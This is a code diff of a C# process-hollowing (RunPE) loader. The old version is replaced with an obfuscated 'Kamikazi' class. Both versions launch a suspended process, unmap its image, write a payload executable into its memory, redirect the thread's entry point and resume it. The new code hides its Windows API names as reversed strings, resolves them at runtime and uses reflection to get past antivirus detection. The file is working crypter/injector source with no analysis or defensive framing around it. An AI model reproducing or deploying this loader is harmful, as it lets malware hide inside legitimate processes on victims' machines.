@@ -1,216 +1,179 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using Microsoft.VisualBasic;
 
-//Developer İntrusive
-//Developer İntrusive
-//Developer İntrusive
-//Developer İntrusive
-//Developer İntrusive
-
-namespace intrusive
+namespace GIT
 {
-    public static class ömer
+    public class Kamikazi
     {
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool CreateProcess_API(string applicationName, string commandLine, System.IntPtr processAttributes, System.IntPtr threadAttributes, bool inheritHandles, uint creationFlags, System.IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool GetThreadContext_API(System.IntPtr thread, int[] context);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool Wow64GetThreadContext_API(System.IntPtr thread, int[] context);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool SetThreadContext_API(System.IntPtr thread, int[] context);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool Wow64SetThreadContext_API(System.IntPtr thread, int[] context);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool ReadProcessMemory_API(System.IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern bool WriteProcessMemory_API(System.IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
-        [System.Runtime.InteropServices.DllImport("ntdll.dll", EntryPoint = "UnmapViewOfSection")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern int NtUnmapViewOfSection_API(System.IntPtr process, int baseAddress);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern int VirtualAllocEx_API(System.IntPtr handle, int address, int length, int type, int protect);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
-        [System.Security.SuppressUnmanagedCodeSecurity]
-        private static extern int ResumeThread_API(System.IntPtr handle);
-        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
-        private struct PROCESS_INFORMATION
+        public static Int16 ToInt16(byte[] value, int startIndex)
         {
-            public System.IntPtr HasanHandle;
-            public System.IntPtr TihradHandle;
-            public uint _processıd;
-            public uint _threadıd;
-        } // PROCESS_INFORMATION
-
-        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack = 1)]
-        private struct STARTUP_INFORMATION
+            return (Int16)typeof(BitConverter).GetMethod("ToIn" + "t16").Invoke(null, new object[] { value, startIndex });
+        }
+        public static Int32 ToInt32(byte[] value, int startIndex)
         {
-            public uint Size_;
-            public string _reversed1s_;
-            public string _desktop_;
-            public string _title_;
-
-            public int dwX;
-            public int dwY;
-            public int dwXSize;
-            public int dwYSize;
-            public int dwXCountChars;
-            public int dwYCountChars;
-            public int dwFillAttribute;
-            public int FLAGSS;
-            public short wShowWindow;
-            public short cbReserved2;
-            public System.IntPtr Reserved2;
-            public System.IntPtr StdInput;
-            public System.IntPtr StdOutput;
-            public System.IntPtr StdError;
-        } 
-
-        public static bool Run(string path, string cmd, byte[] data, bool compatible)
+            return (Int32)typeof(BitConverter).GetMethod("To" + "Int32").Invoke(null, new object[] { value, startIndex });
+        }
+        public static byte[] GetBytes(int value)
         {
-            for (int fri = 1; fri <= 5; fri++)
+            System.Reflection.MethodInfo[] mi = typeof(BitConverter).GetMethods();
+            byte[] Result = new byte[] { };
+            for (int i = 0; i < mi.Length; i++)
             {
-                if (HandleRun(path, cmd, data, compatible))
-                    return true;
-            }
-
-            return false;
-        } // Run
-        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
-        {
-            int ReadWrite = 0;
-            string QuotedPath = string.Format("\"{0}\"", path);
-
-            STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
-            PROCESS_INFORMATION PI = new PROCESS_INFORMATION();
-
-            SI.FLAGSS = 0;
-            SI.Size_ = System.Convert.ToUInt32(System.Runtime.InteropServices.Marshal.SizeOf(typeof(STARTUP_INFORMATION)));
-
-            try
-            {
-                if (!string.IsNullOrEmpty(cmd))
-                    QuotedPath = QuotedPath + " " + cmd;
-
-                if (!CreateProcess_API(path, QuotedPath, System.IntPtr.Zero, System.IntPtr.Zero, false, 4, System.IntPtr.Zero, null, ref SI, ref PI))
-                    throw new System.Exception();
-
-                int FileAddress = System.BitConverter.ToInt32(data, 60);
-                int ImageBase = System.BitConverter.ToInt32(data, FileAddress + 52);
-
-                int[] Context_ = new int[179];
-                Context_[0] = 65538;
-
-                if (System.IntPtr.Size == 4)
+                if (mi[i].Name == "Get" + "Bytes")
                 {
-                    if (!GetThreadContext_API(PI.TihradHandle, Context_))
-                        throw new System.Exception();
-                }
-                else if (!Wow64GetThreadContext_API(PI.TihradHandle, Context_))
-                    throw new System.Exception();
-
-                int Ebx = Context_[41];
-                int BaseAddress = 0;
-
-                if (!ReadProcessMemory_API(PI.HasanHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
-                    throw new System.Exception();
-
-                if (ImageBase == BaseAddress)  //Developer İntrusive
-                {
-                    if (!(NtUnmapViewOfSection_API(PI.HasanHandle, BaseAddress) == 0))
-                        throw new System.Exception();
-                }
-
-                int SizeOfImage = System.BitConverter.ToInt32(data, FileAddress + 80);
-                int SizeOfHeaders = System.BitConverter.ToInt32(data, FileAddress + 84);
-
-                bool AllowOverride = false;
-                int NewImageBase = VirtualAllocEx_API(PI.HasanHandle, ImageBase, SizeOfImage, 12288, 64); // R1  //Developer İntrusive
-
-		//Developer İntrusive   //Developer İntrusive
-
-                if (!compatible && NewImageBase == 0)
-                {
-                    AllowOverride = true;
-                    NewImageBase = VirtualAllocEx_API(PI.HasanHandle, 0, SizeOfImage, 12288, 64);
-                }
-
-                if (NewImageBase == 0)
-                    throw new System.Exception();
-
-
-                if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
-                    throw new System.Exception();
-
-                int SectionOffset = FileAddress + 248;
-                short NumberOfSections = System.BitConverter.ToInt16(data, FileAddress + 6);
-
-                for (int fri = 0; fri <= NumberOfSections - 1; fri++)
-                {
-                    int VirtualAddress = System.BitConverter.ToInt32(data, SectionOffset + 12);
-                    int SizeOfRawData = System.BitConverter.ToInt32(data, SectionOffset + 16);
-                    int PointerToRawData = System.BitConverter.ToInt32(data, SectionOffset + 20);
-
-                    if (!(SizeOfRawData == 0))
+                    if (mi[i].GetParameters()[0].ParameterType.Name == "In" + "t32")
                     {
-                        byte[] SectionData = new byte[SizeOfRawData - 1 + 1];
-                        System.Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);
-
-                        if (!WriteProcessMemory_API(PI.HasanHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
-                            throw new System.Exception();
+                        Result = (byte[])mi[i].Invoke(null, new object[] { value });
                     }
-
-                    SectionOffset += 40;
                 }
-
-                byte[] PointerData = System.BitConverter.GetBytes(NewImageBase);
-                if (!WriteProcessMemory_API(PI.HasanHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
-                    throw new System.Exception();
-
-                int AddressOfEntryPoint = System.BitConverter.ToInt32(data, FileAddress + 40);
-
-                if (AllowOverride)
-                    NewImageBase = ImageBase;
-                Context_[44] = NewImageBase + AddressOfEntryPoint;
-
-                if (System.IntPtr.Size == 4)
-                {
-                    if (!SetThreadContext_API(PI.TihradHandle, Context_))
-                        throw new System.Exception();
-                }
-                else if (!Wow64SetThreadContext_API(PI.TihradHandle, Context_))
-                    throw new System.Exception();
-
-                if (ResumeThread_API(PI.TihradHandle) == -1)
-                    throw new System.Exception();
             }
-            catch
+            return Result;
+        }
+
+        public static string[] ReturnParams()
+        {
+            string KJ = "23lenrek[||]lldtn[||]daerhTemuseR[||]txetnoCdaerhTteS46woW[||]txetnoCdaerhTteS[||]txetnoCdaerhTteG46woW[||]txetnoCdaerhTteG[||]xEcollAlautriV[||]yromeMssecorPetirW[||]yromeMssecorPdaeR[||]noitceSfOweiVpamnUwZ[||]AssecorPetaerC";
+            return KJ.Split(new string[] { "[||]" }, StringSplitOptions.None);
+        }
+        #region API delegate
+        private delegate int ResumeThread_Delegate(IntPtr handle);
+        private delegate bool Wow64SetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool SetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool Wow64GetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate bool GetThreadContext_Delegate(IntPtr thread, int[] context);
+        private delegate int VirtualAllocEx_Delegate(IntPtr handle, int address, int length, int type, int protect);
+        private delegate bool WriteProcessMemory_Delegate(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
+        private delegate bool ReadProcessMemory_Delegate(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
+        private delegate int ZwUnmapViewOfSection_Delegate(IntPtr process, int baseAddress);
+        private delegate bool CreateProcessA_Delegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
+            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
+        #endregion
+
+        #region API
+        private static readonly ResumeThread_Delegate ResumeThread = LoadApi<ResumeThread_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[2]));
+        private static readonly Wow64SetThreadContext_Delegate Wow64SetThreadContext = LoadApi<Wow64SetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[3]));
+        private static readonly SetThreadContext_Delegate SetThreadContext = LoadApi<SetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[4]));
+        private static readonly Wow64GetThreadContext_Delegate Wow64GetThreadContext = LoadApi<Wow64GetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[5]));
+        private static readonly GetThreadContext_Delegate GetThreadContext = LoadApi<GetThreadContext_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[6]));
+        private static readonly VirtualAllocEx_Delegate VirtualAllocEx = LoadApi<VirtualAllocEx_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[7]));
+        private static readonly WriteProcessMemory_Delegate WriteProcessMemory = LoadApi<WriteProcessMemory_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[8]));
+        private static readonly ReadProcessMemory_Delegate ReadProcessMemory = LoadApi<ReadProcessMemory_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[9]));
+        private static readonly ZwUnmapViewOfSection_Delegate ZwUnmapViewOfSection = LoadApi<ZwUnmapViewOfSection_Delegate>(Strings.StrReverse(ReturnParams()[1]), Strings.StrReverse(ReturnParams()[10]));
+        private static readonly CreateProcessA_Delegate CreateProcessA = LoadApi<CreateProcessA_Delegate>(Strings.StrReverse(ReturnParams()[0]), Strings.StrReverse(ReturnParams()[11]));
+        #endregion
+
+
+        #region CreateAPI
+        [DllImport("kernel32", SetLastError = true)]
+        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        private static CreateApi LoadApi<CreateApi>(string name, string method)
+        {
+            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+        }
+        #endregion
+
+
+        #region Structure
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        private struct ProcessInformation
+        {
+            public readonly IntPtr ProcessHandle;
+            public readonly IntPtr ThreadHandle;
+            public readonly uint ProcessId;
+            private readonly uint ThreadId;
+        }
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        private struct StartupInformation
+        {
+            public uint Size;
+            private readonly string Reserved1;
+            private readonly string Desktop;
+            private readonly string Title;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)] private readonly byte[] Misc;
+            private readonly IntPtr Reserved2;
+            private readonly IntPtr StdInput;
+            private readonly IntPtr StdOutput;
+            private readonly IntPtr StdError;
+        }
+        #endregion
+
+        public static void Execute(string path, byte[] payload)
+        {
+            for (int i = 0; i < 5; i++)
             {
-                System.Diagnostics.Process Pros = System.Diagnostics.Process.GetProcessById(System.Convert.ToInt32(PI._processıd));
-                if (Pros != null)
-                    Pros.Kill();
+                int readWrite = 0;
+                StartupInformation SI = new StartupInformation();
+                ProcessInformation PI = new ProcessInformation();
+                SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
+                try
+                {
+                    bool CPA = CreateProcessA(path, "", IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref SI, ref PI);
+                    if (!CPA)
+                    {
+                        throw new Exception();
+                    }
+                    int fileAddress = ToInt32(payload, 30 + 30);
+                    int imageBase = ToInt32(payload, fileAddress + 50 + 2);
+                    int[] context = new int[170 + 9];
+                    context[0] = 65538;
+                    if (IntPtr.Size == 4)
+                    { if (!GetThreadContext(PI.ThreadHandle, context)) throw new Exception(); }
+                    else
+                    { if (!Wow64GetThreadContext(PI.ThreadHandle, context)) throw new Exception(); }
+                    int ebx = context[41];
+                    int baseAddress = 0;
+                    if (!ReadProcessMemory(PI.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception();
+                    if (imageBase == baseAddress)
+                        if (ZwUnmapViewOfSection(PI.ProcessHandle, baseAddress) != 0) throw new Exception();
+                    int sizeOfImage = ToInt32(payload, fileAddress + 80);
+                    int sizeOfHeaders = ToInt32(payload, fileAddress + 84);
+                    bool allowOverride = false;
+                    int newImageBase = VirtualAllocEx(PI.ProcessHandle, imageBase, sizeOfImage, 12288, 64);
 
-                return false;
+                    if (newImageBase == 0) throw new Exception();
+                    if (!WriteProcessMemory(PI.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
+                    int sectionOffset = fileAddress + 248;
+                    short numberOfSections = ToInt16(payload, fileAddress + 6);
+                    for (int I = 0; I < numberOfSections; I++)
+                    {
+                        int virtualAddress = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 12 });
+                        int sizeOfRawData = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 16 });
+                        int pointerToRawData = (int)typeof(Kamikazi).GetMethod("ToInt32").Invoke(null, new object[] { payload, sectionOffset + 20 });
+                        if (sizeOfRawData != 0)
+                        {
+                            byte[] sectionData = new byte[sizeOfRawData];
+                            typeof(Buffer).GetMethod("BlockCopy").Invoke(null, new object[] { payload, pointerToRawData, sectionData, 0, sectionData.Length });
+                            if (!WriteProcessMemory(PI.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
+                        }
+                        sectionOffset += 40;
+                    }
+                    byte[] pointerData = GetBytes(newImageBase);
+                    if (!WriteProcessMemory(PI.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite)) throw new Exception();
+                    int addressOfEntryPoint = ToInt32(payload, fileAddress + 40);
+                    if (allowOverride) newImageBase = imageBase;
+                    context[44] = newImageBase + addressOfEntryPoint;
+
+                    if (IntPtr.Size == 4)
+                    {
+                        if (!SetThreadContext(PI.ThreadHandle, context)) throw new Exception();
+                    }
+                    else
+                    {
+                        if (!Wow64SetThreadContext(PI.ThreadHandle, context)) throw new Exception();
+                    }
+                    if (ResumeThread(PI.ThreadHandle) == -1) throw new Exception();
+                }
+                catch
+                {
+                    Process.GetProcessById(Convert.ToInt32(PI.ProcessId)).Kill();
+                    continue;
+                }
+                break;
             }
-
-            return true;
         }
     }
-
 }
-
-//Developer İntrusive
-//Developer İntrusive
-//Developer İntrusive
-//Developer İntrusive
